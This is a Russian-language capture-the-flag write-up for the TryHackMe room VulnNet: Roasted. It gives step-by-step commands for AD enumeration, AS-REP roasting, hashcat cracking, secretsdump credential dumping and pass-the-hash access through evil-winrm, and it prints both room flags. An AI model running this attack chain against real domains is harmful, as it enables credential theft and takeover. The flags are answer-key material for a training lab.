# VulnNet Roasted — TryHackMe

**Author:** pwnboberry  
**Date:** Май 2026  

---
Задание комнаты VulnNet: Roasted — в том, чтобы, используя методы перечисления Active Directory, 
обнаружить и проэксплуатировать конкретные ошибки конфигурации, характерные для доменных сред.



### Начинаем сканирование портов командой:
```bash
nmap -sC –sV ip
```

![](https://github.com/Pwnboberry/writeups/blob/main/VulnNet_Roasted/images/nmap.png)

Также было обнаружено имя домена: vulnnet-rst.local

### Запуск smbclient
Через команду
```bash
smbclient -L \\IP\\
```
был посмотрен список общих ресурсов. 
Найдены папки, которые потом пригодились для поиска файлов.

![](https://github.com/Pwnboberry/writeups/blob/main/VulnNet_Roasted/images/smbclient.png)

### Анонимный перебор RID c помощью 
```bash
impacket-lookupsid -no-pass guest@IP
```

![](https://github.com/Pwnboberry/writeups/blob/main/VulnNet_Roasted/images/lookupsid.png)

Получен список всех пользователей домена, но нас интересуют только последние 5 (реальные пользователи)

![](https://github.com/Pwnboberry/writeups/blob/main/VulnNet_Roasted/images/users.png)

Исходя из этого вывода, создаем файл realusers.txt  с именами пользователей для дальнейшей работы

![](https://github.com/Pwnboberry/writeups/blob/main/VulnNet_Roasted/images/realusers.png)

### AS-REP Roasting — получение хэша
Команда
```bash
impacket-GetNPUsers.py -dc-ip IP vulnnet-rst.local/ -usersfile realusers.txt -no-pass
 ```
Утилита проверила всех пользователей и выдала хэш только для t-skid (у него отключена предварительная аутентификация Kerberos).
загружаем его в файл hash.txt

![](https://github.com/Pwnboberry/writeups/blob/main/VulnNet_Roasted/images/GetNPUsers.png)

Расшифровываем хэш пароля для t-skid через команду:
```bash
hashcat -m 18200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
 ```
Результат:

![](https://github.com/Pwnboberry/writeups/blob/main/VulnNet_Roasted/images/pswd.PNG)

### Поиск файла дампа через SMB
Используя учётные данные пользователя t-skid, мы подключились к SMB-шаре и обнаружили файл с дампом паролей, который был скачан для дальнейшего анализа.

![](https://github.com/Pwnboberry/writeups/blob/main/VulnNet_Roasted/images/resetpasswords.png)

Внутри SMB лежал файл, содержащий логин и пароль для выдачи хэшей всех пользователей

![](https://github.com/Pwnboberry/writeups/blob/main/VulnNet_Roasted/images/whitehat.png)

Таким образом, используя команду
```bash
impacket-secretsdump vulnnet-rst.local/a-whitehat@IP
 ```
Находим хэш пароля администратора 

![](https://github.com/Pwnboberry/writeups/blob/main/VulnNet_Roasted/images/adminhash.png)

### Подключаемся к машине
```bash
evil-winrm -u administrator -H хэш -i IP
```
![](https://github.com/Pwnboberry/writeups/blob/main/VulnNet_Roasted/images/evilwinrm.png)

Таким образом, мы получили интерактивную сессию с привилегиями NT AUTHORITY\SYSTEM

### Ищем флаги пользователя
В папках были найдены такие пути:
```bash
C:\Users\Administrator\Desktop\system.txt
```

![](https://github.com/Pwnboberry/writeups/blob/main/VulnNet_Roasted/images/1.png)

<details>
<summary>Вопрос: What is the system flag? (Desktop\system.txt)?</summary>

Ответ: THM{16f45e3934293a57645f8d7bf71d8d4c}

</details>

```bash
C:\Users\t-skid\Desktop\user.txt 
```

![](https://github.com/Pwnboberry/writeups/blob/main/VulnNet_Roasted/images/2.png)

<details>
<summary>Вопрос: What is the user flag? (Desktop\user.txt)</summary>

Ответ: THM{726b7c0baaac1455d05c827b5561f4ed}

</details>

## Заключение
В ходе выполнения комнаты VulnNet: Roasted были успешно применены методы перечисления Active Directory и атаки Kerberos

Флаги пользователя и системы были успешно извлечены и подтверждают завершение комнаты.

Комната демонстрирует типичную цепочку атак на Active Directory, где начальный доступ через AS-REP Roasting в комбинации с утечкой учётных данных в сетевых ресурсах приводит к полной компрометации домена.
